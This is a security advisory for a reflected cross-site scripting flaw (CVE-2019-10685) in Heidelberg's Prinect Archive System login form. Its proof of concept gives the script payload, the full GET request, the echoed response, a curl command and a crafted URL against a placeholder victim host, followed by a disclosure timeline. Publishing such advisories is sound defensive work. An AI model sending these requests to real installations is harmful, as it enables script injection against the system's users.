@@ -1,0 +1,98 @@
+Details
+================
+Software: Prinect Archive System 
+Version: v2015 Release 2.6 
+Homepage: https://www.heidelberg.com
+Advisory report: https://github.com/alt3kx/CVE-2019-10685
+CVE: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10685
+CVSS: 6.1 CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
+CWE-79
+
+Description
+================
+A Reflected Cross Site Scripting (XSS) Vulnerability was discovered in Print Archive System v2015 release 2.6
+
+Vulnerability
+================
+The user supplied input containing JavaScript is echoed back in JavaScript code in an HTML response via the "TextField" parameter.
+
+Proof of concept
+================
+
+Reflected XSS
+Payload: %3cscript%3ealert(1)%3c%2fscript%3e
+
+The offending GET request is: 
+
+GET /am/Login,loginForm.sdirect?formids=TextField%2cTextField_0%2clink&submitmode=&submitname=&TextField=%3cscript%3ealert(1)%3c%2fscript%3e&TextField_0=l0V%21i1s%21C2 HTTP/1.1
+Host: victim_IP:8090
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US,en-GB;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
+Connection: close
+Cookie: JSESSIONID=C665EA9A7594E736D39C93EA8763A01F
+
+Reflected XSS Reponse: 
+
+HTTP/1.1 200 OK
+Server: Apache-Coyote/1.1
+Content-Type: text/html;charset=UTF-8
+Date: Mon, 04 Feb 2019 13:15:12 GMT
+Connection: close
+
+[../snip]
+
+id="msgContainer">Authentication failed for: <script>alert(1)</script> <br/>Click Help button for more information about login permissions.</div>
+
+# curl -i -s -k -X GET
+
+-H "Host: victim:8090" 
+-H "Accept-Encoding: gzip, deflate" 
+-H "Accept: */*" 
+-H "Accept-Language: en-US,en-GB;q=0.9,en;q=0.8" 
+-H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
+-H "Connection: close" 
+-H "Cookie: JSESSIONID=C665EA9A7594E736D39C93EA8763A01F" 
+-b "JSESSIONID=C665EA9A7594E736D39C93EA8763A01F" 
+"http://victim:8090/am/Login,loginForm.sdirect?formids=TextField%2cTextField_0%2clink&submitmode=&submitname=&TextField=%3cscript%3ealert(1)%3c%2fscript%3e&TextField_0=l0V%21i1s%21C2" 
+--proxy http://127.0.0.1:8080
+
+Final payload into URL:
+ 
+http://victim_IP:8090/am/Login,loginForm.sdirect?formids=TextField%2cTextField_0%2clink&submitmode=&submitname=&TextField=%3cscript%3ealert(1)%3c%2fscript%3e&TextField_0=l0V%21i1s%21C2
+
+Mitigations
+================
+No more feedback from the vendor:
+https://www.heidelberg.com
+
+Disclosure policy
+================
+We believes in responsible disclosure.
+Please contact us on Alex Hernandez aka alt3kx (at) protonmail com to acknowledge this report. 
+
+This vulnerability will be published if we do not receive a response to this report with 10 days.
+
+Timeline
+================
+
+2019-02-04: Discovered
+2019-02-25: Retest PRO environment
+2019-03-25: Retest on researcher's ecosystem
+2019-04-02: Vendor notification
+2019-04-03: Vendor feedback received
+2019-04-08: Reminder sent
+2019-04-08: 2nd reminder sent 
+2019-04-11: Internal communication
+2019-04-26: No more feedback received from the vendor
+2019-05-30: New issues found
+2019-06-30: Public Disclosure
+
+Discovered by:
+Alex Hernandez aka alt3kx:
+================
+Please visit https://github.com/alt3kx for more information.
+
+My current exploit list @exploit-db: 
+https://www.exploit-db.com/author/?a=1074 & https://www.exploit-db.com/author/?a=9576
